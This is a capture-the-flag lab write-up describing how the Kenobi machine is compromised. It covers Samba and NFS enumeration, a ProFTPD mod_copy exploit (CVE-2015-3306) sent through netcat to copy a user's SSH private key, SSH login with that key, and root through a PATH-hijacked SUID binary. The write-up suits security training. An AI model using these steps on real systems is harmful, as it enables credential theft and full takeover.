> exploit FTP, SUID, using ssh to gain access

# Ports

* **80** : Apache server
* **21** : ProFTPD server 1.3.5
* **22** : SSH
* **111** : RPC bind running, points to nfs_acl, nlockmgr, mountd
* **139, 445** : Samba server running. 
### Port 80, 21, 22, 111 are used for exploiting

# 80
1. `gobuster` didn't give useful results
2. Homepage didn't contain any useful info, so did the admin.html from the robots.txt file.

# 21
1. ProFTPD server 1.3.5 is vulnerable to rce. [CVE-2015-3306](https://www.cvedetails.com/cve/CVE-2015-3306/).
2. This vulnerability allows us to copy files inside the target file sytem from one location to another within the filesystem. This uses `SITE CPFR` and `SITE CPTO` for copying and pasting respectively
3. We try the msf module `unix/ftp/proftpd_modcopy_exec` and realize that /var/www/html path is not writable by this command. So we can't try an rce.

# 139,445 
1. samba version 4.3.11. 
2. `smbclient -L \\\\10.10.220.111\\` we see a share named 'anonymous'. 
3. `smbclient \\\\10.10.220.111\\anonymous` and we see a file named access.log

# 111
1. Rpc bind connects us to the nfs_acl service running on port 2049. Network file share can be used to get info about the system. We mount the share using mount command.
2. `showmount -e 10.10.220.111`  to list the mount folder available. It lists that folders under /var/* is availble for mounting.
3. `nmap sA --script=nfs-ls,nfs-statfs -p 111 10.10.220.111` shows us the available folders and its permissions.

# EXPLOITATION

From the `access.log` obtained from the samba share we see information about a user `kenobi` and their ssh private key location. `/home/kenobi/.ssh/id_rsa`.
Using the ProFTPD's vulnerable CPFR and CPTO commands we can copy this `id_rsa` file to /var location which can be accessible via nfs on our machine.

## netcat for accessing ftp
1. `nc 10.10.220.111 21`
2. `SITE CPFR /home/kenobi/.ssh/id_rsa`
3. `SITE CPTO /var/tmp/id_rsa`
4. We can now access the file by mounting the /var folder to our machine

`sudo mkdir /mnt/kenobi` followed by `mount 10.10.220.111:/var /mnt/kenobi`
We make `kenobi` directory to mount the files and use the `mount` command to mount the nfs folder.

## ssh
1. `ssh -i /mnt/kenobi/tmp/id_rsa kenobi@10.10.220.111`
2. Logged in.  

# Actions in the low privilege shell
1. Running `find / -perm -u=s -type f 2>/dev/null` , we see that suid bit is set for `menu`, which is not a standard binary found in linux setups.
2. Running the `menu` binary shows that it gives information for kernel, ifconfig and status.
3. Running `strings menu` shows us the underlying commands the binary uses to fetch the info. It uses `uname -r`, `ifonfig` etc and they are not invoked using their absolute paths.
4. So we can create a fake script spawns a shell under root user by naming it either `uname` or `ifconfig` and adding it to the $PATH variable.
5. In /tmp folder we execute `echo "/bin/sh" > ifconfig`, `chmod 777 ifconfig` to create the fake `ifconfig` script and give executable permission to all users.
6. We add /tmp to $PATH by running `export PATH=/tmp: $PATH` (Note: there is no space between : and $ ).
7. Finally run the `menu` binary.

6. We are now root.